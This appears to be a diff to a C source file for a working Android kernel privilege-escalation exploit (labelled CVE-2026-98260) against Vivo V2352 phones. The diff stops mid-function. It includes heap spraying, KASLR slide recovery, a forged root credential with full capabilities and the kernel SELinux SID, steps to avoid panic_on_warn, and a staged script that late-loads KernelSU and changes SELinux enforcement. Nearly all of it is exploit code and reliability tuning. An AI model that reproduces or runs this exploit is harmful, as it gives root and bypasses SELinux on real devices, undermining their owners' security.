@@ -1,15 +1,19 @@
+/* SPDX-License-Identifier: MIT
+ * Adapted from woshigenm/CVE-2026-98260 (MIT) and YuKongA/CVE-2026-98260
+ * (MIT), which carries the plant-recovery, 6.1 cred-layout and KASLR-slide
+ * fixes used below. */
 /*
  * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
- * Target : Vivo V2352GA (PD2352), OriginOS 6 / Android 16
- * Kernel : 6.1.145-android14-11-maybe-dirty
- * SELinux: Enforcing
- * Patches: absent
- * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
+ * Targets : Vivo V2352A/V2352GA (PD2352) 6.1.57 / 6.1.124 / 6.1.145,
+ *           selected from `uname -r` (target-<release>.h)
+ * SELinux : Enforcing
+ * Patches : absent
+ * Mitig.  : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
  *
- * Backport to 6.1.145 V2352GA from woshigenm/CVE-2026-98260 (MIT) and the other 98260 ports.
- * Offsets verified from Image (0x1a2c30, 0xae0ac) + BTF (cred 0xB0, task 0x838, TP 0x40).
- * The trigger, slab layout and offsets are the same; the do_timer_create
- * call site and the tracefs event ids are per-build and are re-derived here.
+ * Backport to the V2352 family from woshigenm/CVE-2026-98260 (MIT) and the
+ * other 98260 ports.  Offsets verified from Image + BTF; the trigger and slab
+ * layout are shared, the do_timer_create call site and the tracefs event ids
+ * are per-build and re-derived at runtime.
  *
  * Two endgames:
  *
@@ -26,10 +30,11 @@
  *     late-load the matching module for the configured KMI.
  *     The parent parks with its socket buffers holding the fake cred page.
  *
- * The trigger leaves a stale timerqueue node; every failed plant parks
- * without reaping (a reaped uncontrolled node panics this kernel).  Reboot
- * is the only cleanup.  Event ids and the linear-map base are discovered at
- * runtime; the tracefs metadata files are not readable from the shell domain.
+ * The trigger leaves a stale timerqueue node.  A plant that fails before the
+ * node can be controlled is reaped and retried; a node that cannot be reaped
+ * safely is kept as a zombie, so a run may park and need a reboot.  Event ids
+ * and the linear-map base are discovered at runtime; the tracefs metadata
+ * files are not readable from the shell domain.
  */
 #define _GNU_SOURCE
 #include <stdio.h>
@@ -68,8 +73,10 @@
 #define PAGE 4096UL
 #define SOCKBUF 8192
 
-/* Per-build target values (6.6.127-android15-8-ga8e7fdfdc746-ab16003472-4k). */
+/* Per-build target values selected by build-timer.cmd from target-<release>.h. */
 #include "target.h"
+
+#define TAINT_WARN_BIT 0x200
 
 #define CHILD_HELLO 0x52445931
 #define CHILD_MAGIC 0x50474552
@@ -94,12 +101,23 @@ static int g_timer_go_r = -1, g_timer_go_w = -1;
 static int g_cpu = CPU_TRIG;
 static unsigned long long g_base;
 static unsigned long long g_slide;
+static long g_start_ms;
+static long g_plant_deadline;
 static int g_held;
 static int g_fake_stage;
 static unsigned long long g_child_task;
 static unsigned g_t_page_alloc, g_t_page_free;
+static int g_dbg_plants, g_dbg_ok, g_dbg_miss, g_dbg_slab_shared;
+static int g_dbg_retry, g_dbg_taint_flips;
 
 static void logf(const char *fmt, ...);
+static long now_ms(void);
+static void trace_health(const char *tag);
+static void dbg_summary(const char *where);
+static void trace_taint_delta(const char *tag, unsigned long before);
+static unsigned long read_tainted(void);
+static int read_panic_on_warn(void);
+static int slide_from_site(unsigned long long site0, unsigned long long *out);
 
 static void slab_usage(const char *tag)
 {
@@ -320,6 +338,17 @@ static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
     return found;
 }
 
+/*
+ * The task cache is sized from arch_task_struct_size, which a vendor may
+ * extend past the BTF struct size.  Accept the whole
+ * [TASK_ALLOC_BYTES, TASK_ALLOC_MAX] range the profile declares instead of a
+ * fixed pair, so one profile covers the point releases of a family.
+ */
+static int task_alloc_size(unsigned long long v)
+{
+    return v >= TASK_ALLOC_BYTES && v <= TASK_ALLOC_MAX;
+}
+
 static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
                             unsigned long long *out)
 {
@@ -339,13 +368,9 @@ static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
         alloc = u64(b, i + 24);
         if (!is_kernel_ptr(ptr))
             continue;
-        /* 6.1.145 V2352GA: task_struct BTF size 0x1500 (5376), 64B aligned.
-         * SLUB may round; accept 0x1500 and common roundups. alloc_node
-         * has same first fields as alloc, so same scan works. */
-        if (req != TASK_ALLOC_BYTES && alloc != TASK_ALLOC_BYTES &&
-            req != 0x1600 && alloc != 0x1600 &&
-            req != 0x1640 && alloc != 0x1640 &&
-            req != 0x1780 && alloc != 0x1780)
+        /* alloc_node has the same leading fields as alloc, so one scan
+         * covers both events. */
+        if (!task_alloc_size(req) && !task_alloc_size(alloc))
             continue;
         *out = ptr;
         found++;
@@ -586,7 +611,31 @@ static unsigned long long calibrate_base(unsigned char *raw)
         return 0;
 
     {
-        int c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);
+        unsigned long long site0 = 0;
+        int c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, &site0);
+
+        /*
+         * Recover the KASLR slide here, before the first plant.  Every plant
+         * that zeroes a stale timer node makes the kernel WARN in
+         * timerqueue_del, and with panic_on_warn set that WARN is fatal.  The
+         * only way to disarm it first is to know the slide, and calibration
+         * already produces the timer call site, so derive it now instead of
+         * waiting for the de-tag plants.
+         */
+        if (site0)
+        {
+            unsigned long long slide;
+
+            if (slide_from_site(site0, &slide) == 0)
+            {
+                g_slide = slide;
+                logf("[+] slide=%#llx from calibration site=%#llx\n",
+                     g_slide, site0);
+            }
+            else
+                logf("[!] calibration site=%#llx unusable for a slide\n",
+                     site0);
+        }
 
         for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
         {
@@ -692,6 +741,24 @@ static int prepare_fragmented_range(void)
     return 0;
 }
 
+/*
+ * True once the process that owns this mm is gone.
+ *
+ * The helpers are children of the target process (clone(CLONE_VM) from
+ * run_target), so while it lives getppid() is exactly g_target_tgid.  When it
+ * dies the kernel reparents them to init or a subreaper, so the values differ
+ * and the helper can stop.  This runs between mprotect rounds, so it must stay
+ * a single cheap syscall.
+ */
+static int target_gone(void)
+{
+    int want = atomic_load(&g_target_tgid);
+
+    if (want <= 0)
+        return 1;
+    return getppid() != (pid_t)want;
+}
+
 static int locker_fn(void *x)
 {
     int prot = PROT_NONE;
@@ -700,7 +767,13 @@ static int locker_fn(void *x)
     prctl(PR_SET_NAME, g_helper_name, 0, 0, 0);
     pin(slot ? 3 : 1);
     while (!atomic_load(&g_go))
+    {
+        /* Helpers share the target's mm, so a dead target leaves them
+         * spinning on its 50,000 VMAs forever. */
+        if (target_gone())
+            _exit(0);
         sched_yield();
+    }
     atomic_fetch_add(&g_locker_started, 1);
     while (!atomic_load(&g_stop))
     {
@@ -716,7 +789,11 @@ static int killer_fn(void *x)
     prctl(PR_SET_NAME, g_helper_name, 0, 0, 0);
     pin(2);
     while (!(tid = atomic_load(&g_exec_tid)))
+    {
+        if (target_gone())
+            _exit(0);
         sched_yield();
+    }
     tgid = atomic_load(&g_target_tgid);
     for (;;)
     {
@@ -819,10 +896,21 @@ static void run_target(void)
         sched_yield();
 }
 
+/* Spray load stretches a fixed poll count, so judge the timeout in wall
+ * time.  Upstream measured its first plant at 974 ms; this device's recorded
+ * runs are slower (successful bursts up to 6.4 s), so allow 8 s before a
+ * plant is declared stuck.  The plant budget below still bounds the total. */
+#define ZOMBIE_TIMEOUT_MS 8000
+/* Total budget for the plant phase.  The app stops monitoring after 150 s, so
+ * a run that cannot finish must park with a precise reason before then
+ * instead of being cut off mid-plant. */
+#define PLANT_BUDGET_MS 110000
 static int wait_zombie(pid_t pid, siginfo_t *si)
 {
     struct timespec pause = {.tv_nsec = 200000};
-    for (int i = 0; i < 25000; i++)
+    long start = now_ms();
+
+    while (now_ms() - start < ZOMBIE_TIMEOUT_MS)
     {
         memset(si, 0, sizeof(*si));
         if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
@@ -845,7 +933,8 @@ static void terminate_owned_helpers(void)
 {
     DIR *processes = opendir("/proc");
     struct dirent *entry;
-    int killed = 0;
+    int killed = 0, matched = 0, scanned = 0;
+
     if (!processes)
     {
         logf("[!] cannot enumerate Timer helpers errno=%d\n", errno);
@@ -862,6 +951,7 @@ static void terminate_owned_helpers(void)
         int process = openat(dirfd(processes), entry->d_name, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
         if (process < 0)
             continue;
+        scanned++;
         int comm = openat(process, "comm", O_RDONLY | O_CLOEXEC);
         if (comm >= 0)
         {
@@ -872,17 +962,25 @@ static void terminate_owned_helpers(void)
                 name[strcspn(name, "\n")] = '\0';
                 if (!strcmp(name, g_helper_name))
                 {
+                    matched++;
                     if (syscall(SYS_pidfd_send_signal, process, SIGKILL, NULL, 0) == 0)
                         killed++;
                     else if (errno != ESRCH)
-                        logf("[!] cannot kill helper pid=%s errno=%d\n", entry->d_name, errno);
+                        logf("[!] cannot kill helper pid=%s errno=%d\n",
+                             entry->d_name, errno);
                 }
             }
         }
         close(process);
     }
     closedir(processes);
-    logf("[+] Timer helper SIGKILL sent: %d\n", killed);
+    /*
+     * Report scanned as well as matched/killed.  Without it, "0/0" cannot be
+     * told apart from "/proc enumeration returned nothing", and a stale
+     * helper left spinning at 100% CPU would look identical to a clean run.
+     */
+    logf("[+] Timer helper cleanup: scanned=%d matched=%d killed=%d\n",
+         scanned, matched, killed);
 }
 
 static void finish_run(void)
@@ -907,8 +1005,22 @@ static void finish_run(void)
     }
 }
 
+static void dbg_summary(const char *where)
+{
+    unsigned long taint = read_tainted();
+
+    logf("[dbg] SUMMARY %s plants=%d ok=%d miss=%d slab_busy=%d "
+         "retryable=%d held=%d taint=%#lx taint_warn=%d pid=%d\n",
+         where, g_dbg_plants, g_dbg_ok, g_dbg_miss,
+         g_dbg_slab_shared, g_dbg_retry, g_held, taint,
+         (taint & TAINT_WARN_BIT) ? 1 : 0, getpid());
+}
+
 static void park_forever(const char *why)
 {
+    trace_health("park");
+    dbg_summary("park");
+    logf("[dbg] parking reason=%s\n", why);
     finish_run();
     logf("[!] %s -- parking without reap (zombie held)\n", why);
     fflush(stdout);
@@ -930,8 +1042,9 @@ static void build_payload(unsigned char *buf, size_t off,
     *(unsigned long long *)(buf + off + 0x10) = target;
 }
 
-/* Final stage: hand off to the privileged child. */
-static void write_ksu_script(void)
+/* Final stage: hand off to the privileged child. Returns 0 only when the
+ * script is complete on disk, so a partial write cannot be sourced later. */
+static int write_ksu_script(void)
 {
     static const char script[] =
         "#!/system/bin/sh\n"
@@ -944,7 +1057,7 @@ static void write_ksu_script(void)
         "if [ ! -x \"$KSUD\" ]; then echo '[ksu] ksud missing for selected manager'; exit 1; fi\n"
         "ls -l \"$KSUD\" 2>&1 | head -1\n"
         "echo \"[ksu] ksud=$KSUD version=$(\"$KSUD\" --version 2>&1 | head -1)\"\n"
-        "\"$KSUD\" late-load --kmi android14-6.1 --allow-shell "
+        "\"$KSUD\" late-load --allow-shell "
         "--package-name \"$PKG\"\n"
         "echo \"[ksu] late-load rc=$?\"\n"
         /* late-load daemonizes. Its launcher exiting does not mean init is done. */
@@ -962,14 +1075,21 @@ static void write_ksu_script(void)
         "echo '[ksu] late-load finished'\n"
         "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
         "echo \"[ksu] enforce=$(getenforce)\"\n";
-    int fd = open("/data/local/tmp/ksu_stage.sh",
-                  O_WRONLY | O_CREAT | O_TRUNC, 0755);
+    ssize_t n;
+    int fd, rc = 0;
 
+    fd = open("/data/local/tmp/ksu_stage.sh",
+              O_WRONLY | O_CREAT | O_TRUNC, 0755);
     if (fd < 0)
-        return;
-    (void)!write(fd, script, sizeof(script) - 1);
-    close(fd);
-    (void)chmod("/data/local/tmp/ksu_stage.sh", 0755);
+        return -1;
+    n = write(fd, script, sizeof(script) - 1);
+    if (n != (ssize_t)(sizeof(script) - 1))
+        rc = -1;
+    if (close(fd))
+        rc = -1;
+    if (chmod("/data/local/tmp/ksu_stage.sh", 0755))
+        rc = -1;
+    return rc;
 }
 
 static int read_panic_on_warn(void)
@@ -987,37 +1107,120 @@ static int read_panic_on_warn(void)
     return value;
 }
 
+/*
+ * /proc/sys/kernel/tainted is readable from the shell domain and survives a
+ * WARN, so it is the only dmesg-free way to tell that the kernel took a
+ * warning during a run.  Bit 8 (0x100) is TAINT_WARN: set by add_taint() from
+ * warn_slowpath / WARN_ON, which is exactly what timerqueue_del hits when the
+ * stale node is erased a second time.
+ */
+static unsigned long read_tainted(void)
+{
+    FILE *f = fopen("/proc/sys/kernel/tainted", "r");
+    unsigned long value = 0;
+
+    if (f)
+    {
+        if (fscanf(f, "%lu", &value) != 1)
+            value = 0;
+        fclose(f);
+    }
+    return value;
+}
+
+/* Snapshot of kernel health plus the counters that decide a plant's fate.
+ * Printed around every plant so a log alone describes what happened, without
+ * needing dmesg (which is lost on reboot and unreadable from adb). */
+static void trace_health(const char *tag)
+{
+    unsigned long taint = read_tainted();
+
+    logf("[dbg] %s taint=%#lx taint_warn=%d held=%d\n", tag, taint,
+         (taint & TAINT_WARN_BIT) ? 1 : 0, g_held);
+}
+
+/* Emit a WARN marker the moment the kernel taint flips, so the log points at
+ * the plant that caused it instead of only the end of the run. */
+static void trace_taint_delta(const char *tag, unsigned long before)
+{
+    unsigned long now = read_tainted();
+
+    if (now != before)
+    {
+        unsigned long bits = now & ~before;
+
+        logf("[dbg] %s TAINT CHANGED %#lx -> %#lx (new bits %#lx)\n", tag,
+             before, now, bits);
+        if (bits & TAINT_WARN_BIT)
+            logf("[!] KERNEL WARN during %s: the stale timer node was "
+                 "touched again (panic_on_warn=%d)\n",
+                 tag, read_panic_on_warn());
+    }
+}
+
+/*
+ * Outcome of one plant.  `why` names the exact failure branch so a log can be
+ * read without guessing: two very different conditions used to both surface
+ * as "burst hit=0" (a real miss versus a victim rejected before the burst).
+ */
 struct plant_res
 {
     unsigned long long A;
     int ok;
     int retry;
+    const char *why;
+    int free_seen;
+    int hit;
+    int slab_own;
+    int nrec;
+    long elapsed_ms;
 };
 
 static void run_plant(unsigned long long target, int tag, int mode,
-                      struct plant_res *res, unsigned char *raw);
+                      struct plant_res *res, unsigned char *raw);static int plant_budget_left(void);
 
 static int stage_write(unsigned long long target, int mode,
                        const char *what, unsigned char *raw,
                        struct plant_res *out)
 {
     struct plant_res r;
+    long start = now_ms();
 
     for (int attempt = 1; attempt <= 3; attempt++)
     {
+        unsigned long taint_before = read_tainted();
+
         memset(&r, 0, sizeof(r));
         logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
              mode == 2 ? "fake" : "zero", attempt);
+        trace_health("pre-plant");
         run_plant(target, 1, mode, &r, raw);
+        trace_taint_delta("post-plant", taint_before);
         if (r.ok)
         {
             if (out)
                 *out = r;
+            logf("[+] stage %s done in %ldms (free_seen=%d hit=%d "
+                 "slab_own=%d/%d recs=%d)\n",
+                 what, now_ms() - start, r.free_seen, r.hit, r.slab_own,
+                 (int)(0x2000 / TIMER_ALLOC), r.nrec);
             return 0;
         }
-        /* Retry on any failure. A burst-miss holds the previous victim's
-         * zombie (safe: it is never reaped), so a fresh plant is still valid. */
-        logf("[-] stage %s attempt=%d failed, retrying\n", what, attempt);
+        logf("[-] stage %s attempt=%d failed why=%s elapsed=%ldms\n", what,
+             attempt, r.why ? r.why : "?", r.elapsed_ms);
+        if (!r.retry)
+        {
+            /* The failed plant left a node that cannot be reaped safely, so
+             * another attempt would race the same held zombie. */
+            logf("[-] stage %s failed\n", what);
+            return -1;
+        }
+        if (!plant_budget_left())
+        {
+            logf("[-] stage %s out of time after %ldms\n", what,
+                 now_ms() - start);
+            return -1;
+        }
     }
     logf("[-] stage %s exhausted retries\n", what);
     return -1;
@@ -1039,22 +1242,30 @@ struct spray_arg
     int sock_first, sock_count, cpu, idx;
 };
 
-static void ensure_pool(void)
+static int ensure_pool(void)
 {
     int snd = 16 << 20;
 
-    if (g_pool_n)
-        return;
-    for (int i = 0; i < SPRAY_SOCKS; i++)
-    {
-        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
-            break;
-        setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
-        setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
-        g_pool_n++;
-    }
     if (!g_pool_n)
-        park_forever("no spray sockets");
+    {
+        for (int i = 0; i < SPRAY_SOCKS; i++)
+        {
+            if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
+                break;
+            setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
+            setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
+            g_pool_n++;
+        }
+    }
+    if (g_pool_n < SPRAY_THREADS * 32)
+    {
+        logf("[-] only %d spray sockets (need %d)\n", g_pool_n,
+             SPRAY_THREADS * 32);
+        return -1;
+    }
+    logf("[+] spray pool=%d sockets, %d per thread\n", g_pool_n,
+         g_pool_n / SPRAY_THREADS);
+    return 0;
 }
 
 static void ensure_raw(void)
@@ -1118,8 +1329,13 @@ static void *spray_thread(void *x)
 
     atomic_store(&g_spray_tids[a->idx], (int)syscall(SYS_gettid));
     pin(a->cpu);
-    while (!atomic_load(&g_burst) && !atomic_load(&g_stop_spray))
+    while (!atomic_load(&g_burst))
+    {
+        /* Failure paths join these threads without releasing them. */
+        if (atomic_load(&g_stop_spray))
+            return NULL;
         sched_yield();
+    }
     /* Phase 1 runs before the target execs; it catches an early free. */
     while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE)
     {
@@ -1141,6 +1357,66 @@ static void *spray_thread(void *x)
     return NULL;
 }
 
+static void spray_join(pthread_t *th, const int *created)
+{
+    for (int i = 0; i < SPRAY_THREADS; i++)
+        if (created[i])
+            (void)pthread_join(th[i], NULL);
+}
+
+static void close_pipe(int p[2])
+{
+    for (int i = 0; i < 2; i++)
+        if (p[i] >= 0)
+        {
+            close(p[i]);
+            p[i] = -1;
+        }
+}
+
+static void close_timer_go(void)
+{
+    if (g_timer_go_w >= 0)
+    {
+        close(g_timer_go_w);
+        g_timer_go_w = -1;
+    }
+}
+
+/*
+ * Recover the KASLR slide from the ftrace call site.
+ *
+ * Two record shapes appear in the wild:
+ *   - 6.1 GKI/mi stores the full 8-byte call_site.  The subtraction is exact
+ *     and the slide can exceed 4 GiB (0x2f74000000 = 190 GiB observed on
+ *     V2352GA).
+ *   - some vendor android15-8 (6.6) builds store the field in 4 bytes, so the
+ *     high half of the record is neighbouring memory and the subtraction is
+ *     garbage (0x2519c00000 observed upstream).  There KASLR only moves the
+ *     image inside a 4 GiB window, so the low 32 bits recover the real slide.
+ *
+ * The two shapes cannot be told apart from the value: a bogus 4-byte-derived
+ * slide is 2 MiB aligned and canonical too, so every runtime heuristic that
+ * was tried either accepts garbage or rejects the real 190 GiB slides on this
+ * device.  The field width is therefore a per-build fact and lives in the
+ * profile (`TIMER_SITE_FIELD_BYTES`).
+ *
+ * What is checked at runtime is that the recovered slide is 2 MiB aligned.
+ * A record that fails that is unusable and must never feed the static
+ * addresses in the fake cred.
+ */
+static int slide_from_site(unsigned long long site0, unsigned long long *out)
+{
+    unsigned long long slide = site0 - STATIC_TIMER_SITE;
+
+    if (TIMER_SITE_FIELD_BYTES == 4)
+        slide &= 0xffffffffULL;
+    if (slide & 0x1fffffULL)
+        return -1;
+    *out = slide;
+    return 0;
+}
+
 static void run_plant(unsigned long long target, int tag, int mode,
                       struct plant_res *res, unsigned char *raw)
 {
@@ -1149,17 +1425,30 @@ static void run_plant(unsigned long long target, int tag, int mode,
     unsigned char *payload = NULL;
     pthread_t th[SPRAY_THREADS];
     struct spray_arg args[SPRAY_THREADS];
-    int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
+    int created[SPRAY_THREADS] = {0};
+    int ready_p[2] = {-1, -1}, ack_p[2] = {-1, -1};
+    int tid_p[2] = {-1, -1}, timer_go[2] = {-1, -1};
     memset(res, 0, sizeof(*res));
+    res->why = "unknown";
+    long plant_start = now_ms();
+    trace_health("plant-entry");
     if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(timer_go))
     {
         logf("[-] plant%d pipe failed\n", tag);
+        close_pipe(ready_p);
+        close_pipe(ack_p);
+        close_pipe(tid_p);
+        close_pipe(timer_go);
         return;
     }
     pid_t T = fork();
     if (T < 0)
     {
         logf("[-] plant%d fork failed\n", tag);
+        close_pipe(ready_p);
+        close_pipe(ack_p);
+        close_pipe(tid_p);
+        close_pipe(timer_go);
         return;
     }
     if (T == 0)
@@ -1176,23 +1465,41 @@ static void run_plant(unsigned long long target, int tag, int mode,
         _exit(115);
     }
     close(ready_p[1]);
+    ready_p[1] = -1;
     close(ack_p[0]);
+    ack_p[0] = -1;
     close(tid_p[1]);
+    tid_p[1] = -1;
     close(timer_go[0]);
+    timer_go[0] = -1;
     g_timer_go_w = timer_go[1];
+    timer_go[1] = -1;
     char ch;
-    if (read(ready_p[0], &ch, 1) != 1)
+    int ready = read(ready_p[0], &ch, 1) == 1;
+    close(ready_p[0]);
+    ready_p[0] = -1;
+    if (!ready)
     {
         logf("[-] plant%d trigger never ready\n", tag);
+            res->why = "trigger_never_ready";
+        close_pipe(ack_p);
+        close_pipe(tid_p);
+        close_timer_go();
         kill(T, SIGKILL);
         waitpid(T, NULL, 0);
+        res->retry = 1;
         return;
     }
     trace_start();
     if (write(ack_p[1], "A", 1) != 1)
         logf("[-] ack failed\n");
+    close(ack_p[1]);
+    ack_p[1] = -1;
     int etid = 0;
-    if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
+    int got_tid = read(tid_p[0], &etid, sizeof(etid)) == sizeof(etid);
+    close(tid_p[0]);
+    tid_p[0] = -1;
+    if (!got_tid)
         logf("[-] exec tid not received\n");
 
     /*
@@ -1215,6 +1522,9 @@ static void run_plant(unsigned long long target, int tag, int mode,
         kill(T, SIGKILL);
         waitpid(T, NULL, 0);
         logf("[-] plant%d victim not captured (recs=%d)\n", tag, nrec);
+            res->why = "victim_not_captured";
+        close_timer_go();
+        res->retry = 1;
         return;
     }
     {
@@ -1232,6 +1542,9 @@ static void run_plant(unsigned long long target, int tag, int mode,
             waitpid(T, NULL, 0);
             logf("[-] plant%d bad base=%#llx ns=%d np=%d recs=%d\n",
                  tag, base, ns, np, nrec);
+            res->why = "bad_base";
+            close_timer_go();
+            res->retry = 1;
             return;
         }
         g_base = base;
@@ -1254,6 +1567,9 @@ static void run_plant(unsigned long long target, int tag, int mode,
         kill(T, SIGKILL);
         waitpid(T, NULL, 0);
         logf("[-] plant%d victim index missing (kept=%d)\n", tag, nkeep);
+            res->why = "victim_index_missing";
+        close_timer_go();
+        res->retry = 1;
         return;
     }
     V = kept[VICTIM_IDX];
@@ -1261,9 +1577,46 @@ static void run_plant(unsigned long long target, int tag, int mode,
     for (int i = 0; i < nkeep; i++)
         if ((kept[i] & ~0x1fffULL) == vslab)
             slab_own++;
+    /*
+     * The victim slab must be ours end to end: a single foreign k_itimer in
+     * the same 8 KiB page keeps it off the buddy list forever, so the burst
+     * can never see it (free_seen=0).  Draw again instead of racing a page
+     * that cannot free.
+     */
+    if (slab_own < (int)(0x2000 / TIMER_ALLOC))
+    {
+        trace_stop();
+        kill(T, SIGKILL);
+        waitpid(T, NULL, 0);
+        logf("[-] plant%d victim slab shared (%d/%d own); retryable\n",
+             tag, slab_own, (int)(0x2000 / TIMER_ALLOC));
+            res->why = "slab_shared";
+        close_timer_go();
+        res->retry = 1;
+        return;
+    }
     pfn = (V - g_base) >> 12;
     slab_pfn = pfn & ~1ULL;
-    g_slide = site0 - STATIC_TIMER_SITE;
+    {
+        unsigned long long slide = 0;
+
+        if (slide_from_site(site0, &slide) == 0)
+            g_slide = slide;
+        else if (mode == 2)
+        {
+            /* The exec never ran, so the target can be reaped safely. */
+            trace_stop();
+            kill(T, SIGKILL);
+            waitpid(T, NULL, 0);
+            close_timer_go();
+            logf("[-] plant%d unusable site0=%#llx; retryable\n", tag, site0);
+            res->why = "unusable_site0";
+            res->retry = 1;
+            return;
+        }
+        else
+            logf("[!] plant%d unusable site0=%#llx (unused)\n", tag, site0);
+    }
 
     {
         size_t off = (size_t)((V & 0x1fff) + 0x78);
@@ -1271,6 +1624,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
         payload = malloc(SOCKBUF);
         if (!payload)
         {
+            close_timer_go();
             kill(T, SIGKILL);
             waitpid(T, NULL, 0);
             return;
@@ -1287,10 +1641,34 @@ static void run_plant(unsigned long long target, int tag, int mode,
             {
                 logf("[-] plant%d fake cred spills off=%#zx; retryable\n",
                      tag, off);
+                res->why = "fake_cred_spills";
                 kill(T, SIGKILL);
                 waitpid(T, NULL, 0);
                 free(payload);
                 payload = NULL;
+                close_timer_go();
+                res->retry = 1;
+                return;
+            }
+            /*
+             * The fake cred must not straddle the 4 KiB boundary inside the
+             * reclaimed order-1 block.  With the node at V, the cred starts at
+             * V+0x78, so a node in the last 0x88 bytes of a page puts euid,
+             * egid, fsuid and fsgid in the *next* page.  Every recorded run
+             * with that layout failed while uid still landed
+             * (`uid=0 euid=-118`), because the later zero writes to the tail
+             * fields did not take effect.  Draw another victim instead.
+             */
+            if ((off & 0xfff) + CRED_REQ > 0x1000)
+            {
+                logf("[-] plant%d fake cred straddles page off=%#zx; retryable\n",
+                     tag, off);
+                res->why = "fake_cred_straddles";
+                kill(T, SIGKILL);
+                waitpid(T, NULL, 0);
+                free(payload);
+                payload = NULL;
+                close_timer_go();
                 res->retry = 1;
                 return;
             }
@@ -1309,39 +1687,51 @@ static void run_plant(unsigned long long target, int tag, int mode,
             }
             if (!fit)
             {
+                res->why = "blob_no_fit";
                 kill(T, SIGKILL);
                 waitpid(T, NULL, 0);
                 free(payload);
                 payload = NULL;
+                close_timer_go();
                 res->retry = 1;
                 return;
             }
             build_payload(payload, off, V + 0x78, target);
-            /* 6.1.145 V2352GA: cred.uid at 4 (c0 high), gid 8, suid 12, sgid 16,
-             * euid 20, egid 24, fsuid 28, fsgid 32, securebits 36,
-             * caps at 40/48/56/64/72 (c5..c9), security 120 (0x78).
-             * Stale node (32B) dirties bytes 8-23 (c1,c2: gid/suid/sgid/euid).
-             * c0 (usage|uid) stays 0 (usage 0 ok, pinned page), uid fixed later.
-             * euid (c2 high) needs extra fix (see fake_uid2 below). */
-            c[3] = 0; /* egid (24) + fsuid (28) */
-            c[4] = 0; /* fsgid (32) + securebits (36) */
-            /* c5..c9 = full caps for 6.1 (40,48,56,64,72) */
-            for (int i = 5; i <= 9; i++)
-                c[i] = FULLCAP; /* inh/prm/eff/bset/ambient */
-            c[10] = 0;          /* jit_keyring + hole */
-            *(unsigned long long *)(payload + off + 0x78) =
-                page + blob; /* security (120) */
-            *(unsigned long long *)(payload + off + 0x80) =
-                ROOT_USER_STATIC + g_slide; /* user (128) */
-            *(unsigned long long *)(payload + off + 0x88) =
-                INIT_USER_NS_STATIC + g_slide; /* user_ns (136) */
-            *(unsigned long long *)(payload + off + 0x90) =
-                INIT_UCOUNTS_STATIC + g_slide; /* ucounts (144) */
-            *(unsigned long long *)(payload + off + 0x98) =
-                INIT_GROUPS_STATIC + g_slide; /* group_info (152) */
-            *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF) =
+            /* rb_erase dirties uid/gid (c[1]) and leaves the erase target
+             * in c[2]; the later zero plants repair both.  6.1's 4-byte
+             * usage puts euid in c[2] as well, hence its own euid write. */
+            c[3] = 0; /* euid/egid */
+            c[4] = 0; /* fsuid/fsgid */
+            if (CRED_UID_OFF == 8)
+            {
+                c[5] = 0; /* securebits */
+                for (int i = 6; i <= 10; i++)
+                    c[i] = FULLCAP; /* inh/prm/eff/bset/ambient */
+            }
+            else
+            {
+                for (int i = 5; i <= 9; i++)
+                    c[i] = FULLCAP; /* inh/prm/eff/bset/ambient */
+            }
+            {
+                size_t sec = CRED_UID_OFF == 8 ? 0x80 : 0x78;
+
+                *(unsigned long long *)(payload + off + sec) =
+                    page + blob; /* security */
+                *(unsigned long long *)(payload + off + sec + 8) =
+                    ROOT_USER_STATIC + g_slide;
+                *(unsigned long long *)(payload + off + sec + 16) =
+                    INIT_USER_NS_STATIC + g_slide;
+                *(unsigned long long *)(payload + off + sec + 24) =
+                    INIT_UCOUNTS_STATIC + g_slide;
+                *(unsigned long long *)(payload + off + sec + 32) =
+                    INIT_GROUPS_STATIC + g_slide;
+            }
+            /* SELinux's cred blob offset comes from the profile: 0 when it
+             * is the only cred blob, 8 when landlock precedes it. */
+            *(unsigned int *)(payload + blob + SELINUX_CRED_OFF) =
                 SELINUX_SID_KERNEL;
-            *(unsigned int *)(payload + blob + SELINUX_BLOB_OFF + 4) =
+            *(unsigned int *)(payload + blob + SELINUX_CRED_OFF + 4) =
                 SELINUX_SID_KERNEL;
             logf("[+] plant%d fake cred off=%#zx blob=%#zx sec=%#llx\n",
                  tag, off, blob, page + blob);
@@ -1352,9 +1742,9 @@ static void run_plant(unsigned long long target, int tag, int mode,
         }
         slab_usage("pre-exec");
         logf("[+] plant%d V=%#llx A=%#llx pfn=%#llx slab=%#llx slide=%#llx "
-             "recs=%d slab_own=%d/32 base=%#llx\n",
+             "recs=%d slab_own=%d/%d base=%#llx\n",
              tag, V, V + 0x78, pfn, slab_pfn, g_slide, nrec, slab_own,
-             g_base);
+             (int)(0x2000 / TIMER_ALLOC), g_base);
     }
 
     atomic_store(&g_burst, 0);
@@ -1371,19 +1761,44 @@ static void run_plant(unsigned long long target, int tag, int mode,
             args[i].cpu = i;
             args[i].idx = i;
             atomic_store(&g_spray_tids[i], -1);
-            pthread_create(&th[i], NULL, spray_thread, &args[i]);
